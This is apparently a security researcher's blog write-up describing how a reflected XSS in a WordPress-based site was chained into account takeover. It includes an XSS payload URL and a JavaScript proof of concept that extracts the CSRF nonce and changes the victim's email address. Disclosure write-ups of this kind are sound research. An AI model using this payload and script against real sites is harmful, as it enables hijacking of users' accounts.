---
title: "Reflected XSS to Account Takeover"
date: 2025-02-17
draft: false
description: "A reflected XSS bug turns into an ATO due to low security messures"
---
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

## <i class="fa-solid fa-bullseye"></i>  The Vulnerabillity
When researching an application, I noticed that there was a <span class="text-primary-400">feature for resetting the email address</span> of our user. Interestingly, when trying to change it, there was <span class="text-primary-400">no security mechanism verifying that the change was actually initiated by the user</span> of that account. Normally, there’s an extra step where the user must input their password or any other identification method.

So, the first thing that came to mind was trying to carry out a <span class="text-primary-400">CSRF attack</span>, where I force the user to change their email to mine. This would allow me to use the regular “forgot password” function from the website, then input the email address that was set in the victim’s account, receive the reset email, and change the password to a desired one. However, I quickly realized that <span class="text-primary-400">WordPress securely handled CSRF tokens</span> in this application, so I wasn’t able to take that route yet. The next idea was to <span class="text-primary-400">find an XSS vulnerability</span>, which would allow me to just read those tokens out of the HTML and submit the form with those automatically.

### Finding XSS
Luckily, during my research, I came across a simple reflected XSS in the application: `https://example.com/login/confirm_mail.php?email=<img/src/onerror=print()>`

### Creating the Exploit Script
The next step was to create the script that would automatically change the email address in the user’s settings. However, we first have to get the <span class="text-primary-400">nonce that Wordpress added to each form request</span>.

## <i class="fa-solid fa-file"></i> PoC

{{< highlight JS "linenos=false,hl_lines=5 12 19 23" >}}
fetch('https://example.com/edit-account/').then(response => response.text()).then(html => {
    // Fetch the nonce from vulnerable endpoint
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, 'text/html');
    var nonce = doc.getElementById('save-account-details-nonce').value;
    console.log(nonce);

    // Change email
    fetch('https://example.com/edit-account/', {
        method: 'POST',
        // Include Cookies
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `first_name=Test
        &last_name=Test
        &display_name=Test
        &email=<email we controll>
        &password_current=
        &password_1=
        &password_2=
        &save-account-details-nonce=${nonce}`
    })
    .then(response => {
        if (response.ok) {
            console.log("Done!");
        } else {
            console.log("Something went wrong..");
        }
    });
});
{{< /highlight >}}

The password parameters can be left empty, since the application only uses those, when a user wants to change their password via the UI on the website:

```
password_current=
password_1=
password_2=
```

<b class="text-primary-400">Explanation</b>: We first send a request to the vulnerable endpoint to retrieve the nonce:
`https://example.com/edit-account/`. The response is parsed, and the nonce is extracted from the HTML `doc.getElementById('save-account-details-nonce').value`. After that, we send a second request to the endpoint where we then fill out the forms details. This request includes the nonce and the attacker’s desired email address. The credentials parameter ensures cookies are included, maintaining the session context.

With this script in hand we can include it via our reflected XSS `https://example.com/login/confirm_mail.php?email={ATTACKER-SCRIPT}` and send it to a victim. After the script automatically updates the email address of the victim, we can use the already described way via the password reset function. <span class="text-primary-400">Thus, the account is fully compromised where the victim isn't even able to recover the account, since not only the password but also the email address changed</span>.